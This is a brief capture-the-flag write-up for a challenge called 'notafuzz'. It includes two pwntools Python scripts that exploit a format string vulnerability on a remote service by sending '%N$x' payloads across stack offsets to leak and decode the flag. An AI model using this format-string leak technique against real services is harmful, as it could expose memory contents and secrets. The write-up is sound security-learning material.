# notafuzz

I already solves this once, but this time I will try and make a script

So analyzing with Ghidra we have a format string vuln which let's us leak the flag off the stack.

```python
#!/usr/bin/python3

from pwn import *

IP = '35.234.100.160'
port = 30865
context.log_level = 'error'
def waste_2_iterations(r):
    r.recvuntil('?\r\n')
    r.sendline('No')
    r.recvuntil('?\r\n')
    r.sendline('No2')
    r.recvuntil('?\r\n')
def main():
    for i in range(1, 1000):
        try:
            r = remote(IP, port)
        except:
            i = i-1
            sleep(10)
            continue
        waste_2_iterations(r)
        r.sendline('%' + str(i) + '$x')
        # receive our args
        r.recvuntil('\r\n')

        # receve something useful
        try:
            print("This is the " + str(i) + "th iteration: ")
            data = r.recvuntil('It does not look like', drop=True)
            data = str(data)
            data = data.strip('b').strip('\'')
            print("This is the raw hex:" + data)
            data = bytes.fromhex(data).decode('utf-8')
            print("And this is decoded:" + data)
            r.close()
        except:
            r.close()
            continue

if __name__ == "__main__":
    main()
```
Running this we notice that the flag is between 136 and 153

```python
#!/usr/bin/python3

from pwn import *

IP = '35.234.100.160'
port = 30865
context.log_level = 'error'
def waste_2_iterations(r):
    r.recvuntil('?\r\n')
    r.sendline('No')
    r.recvuntil('?\r\n')
    r.sendline('No2')
    r.recvuntil('?\r\n')
def main():
    for i in range(136, 154):
        try:
            r = remote(IP, port)
        except:
            i = i-1
            sleep(10)
            continue
        waste_2_iterations(r)
        r.sendline('%' + str(i) + '$x')
        # receive our args
        r.recvuntil('\r\n')

        # receve something useful
        try:
            # print("This is the " + str(i) + "th iteration: ")
            data = r.recvuntil('It does not look like', drop=True)
            data = str(data)
            data = data.strip('b').strip('\'')
            # print("This is the raw hex:" + data)
            data = bytes.fromhex(data).decode('utf-8')
            # print("And this is decoded:" + data)
            data = data[::-1]
            print(data, end='')
            r.close()
        except:
            r.close()
            continue

if __name__ == "__main__":
    main()
```
So this is the get flag script